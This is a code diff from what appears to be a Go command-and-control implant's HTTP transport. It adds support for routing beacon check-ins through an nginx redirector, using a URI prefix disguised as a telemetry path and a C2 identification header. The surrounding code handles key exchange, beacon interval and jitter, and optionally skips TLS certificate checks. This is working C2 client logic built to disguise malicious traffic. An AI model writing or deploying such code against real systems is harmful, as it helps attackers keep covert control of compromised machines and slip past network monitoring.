@@ -11,25 +11,36 @@ import (
 )
 
 // HTTP implements Transport over POST /api/v1/kex and /api/v1/checkin.
+// It can route through the external nginx redirector: uriPrefix is the
+// redirector route (e.g. /gateway/v1/telemetry) prepended to every API
+// path, and headerName/headerValue is the C2 identification header the
+// redirector requires (empty value disables the header).
 type HTTP struct {
-	base     string
-	client   *http.Client
-	interval int
-	jitter   float64
+	base        string
+	uriPrefix   string
+	headerName  string
+	headerValue string
+	client      *http.Client
+	interval    int
+	jitter      float64
 }
 
 // NewHTTP builds an HTTP(S) transport. insecure allows self-signed certs in
-// lab. interval/jitter are the requested beacon profile sent at KEX.
-func NewHTTP(base string, insecure bool, timeout time.Duration, interval int, jitter float64) *HTTP {
+// lab. uriPrefix, headerName and headerValue are optional (empty disables).
+// interval/jitter are the requested beacon profile sent at KEX.
+func NewHTTP(base string, insecure bool, timeout time.Duration, interval int, jitter float64, uriPrefix, headerName, headerValue string) *HTTP {
 	tr := &http.Transport{
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: insecure},
 		DisableKeepAlives: true,
 	}
 	return &HTTP{
-		base:     base,
-		client:   &http.Client{Transport: tr, Timeout: timeout},
-		interval: interval,
-		jitter:   jitter,
+		base:        base,
+		uriPrefix:   uriPrefix,
+		headerName:  headerName,
+		headerValue: headerValue,
+		client:      &http.Client{Transport: tr, Timeout: timeout},
+		interval:    interval,
+		jitter:      jitter,
 	}
 }
 
@@ -40,11 +51,14 @@ func (h *HTTP) post(path string, body any) (map[string]any, error) {
 	if err != nil {
 		return nil, err
 	}
-	req, err := http.NewRequest("POST", h.base+path, bytes.NewReader(raw))
+	req, err := http.NewRequest("POST", h.base+h.uriPrefix+path, bytes.NewReader(raw))
 	if err != nil {
 		return nil, err
 	}
 	req.Header.Set("Content-Type", "application/json")
+	if h.headerName != "" && h.headerValue != "" {
+		req.Header.Set(h.headerName, h.headerValue)
+	}
 	resp, err := h.client.Do(req)
 	if err != nil {
 		return nil, err
